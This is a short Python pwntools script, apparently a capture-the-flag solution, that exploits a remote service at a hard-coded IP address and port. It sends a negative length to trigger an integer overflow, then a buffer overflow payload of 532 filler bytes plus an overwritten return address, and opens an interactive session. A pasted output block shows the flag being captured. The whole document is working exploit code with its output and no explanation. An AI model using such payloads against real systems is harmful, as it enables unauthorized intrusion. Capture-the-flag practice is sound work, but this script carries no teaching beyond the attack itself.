#!/usr/bin/env python
from pwn import *
r = remote('165.227.98.55', 2223)

r.sendlineafter('?', 'test')
r.sendlineafter(':', 'Y')
r.sendlineafter(':', '-1') # integer overflow

payload  = ''
payload += 'A' * 532
payload += p32(0x104d8)

r.sendline(payload)
r.interactive()

'''
[+] Opening connection to 165.227.98.55 on port 2223: Done
[*] Switching to interactive mode
Please, enter length of your message:
Your opinion is very important to us.
Bye-bye!
h4ck1t{Astronomy_is_fun}
Have a nice day!
'''
